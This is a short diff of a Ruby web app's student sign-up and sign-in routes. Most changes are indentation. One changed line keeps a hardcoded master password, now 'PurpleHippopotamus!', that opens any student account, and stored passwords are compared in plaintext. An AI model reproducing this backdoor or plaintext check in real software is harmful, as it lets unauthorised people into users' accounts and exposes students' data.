@@ -85,14 +85,14 @@ post '/student/reports/create/?' do
               unless (@presentation = Presentation.first(:school_password => params[:school_password])) && (@presentation = Presentation.first(:class_date => Date.today.strftime("%Y-%m-%d")))
                 
                   @presentation = Presentation.create(
-                  :school_id  => @student.school_id,
-                  :class_date  => @student.created_on,
-                  :school_password  => @student.school_password,
-                  :id => @student.presentation_id
+                    :school_id  => @student.school_id,
+                    :class_date  => @student.created_on,
+                    :school_password  => @student.school_password,
+                    :id => @student.presentation_id
                   )
                   
               end
-              
+
               @student.save
                         
               flash[:alert] = 'Welcome to the Occupations Guide. You are now signed in.'
@@ -168,7 +168,7 @@ post '/student/reports/signin/?' do
   unless params[:email] == ''
 
     if student = Student.first(:email => params[:email])
-      if (student.password == params[:password])  || (params[:password] == 'coconutisland')
+      if (student.password == params[:password]) || (params[:password] == "PurpleHippopotamus!")
         session[:student] = student.id
         
         flash[:alert] = 'Welcome back! You are now signed in.'
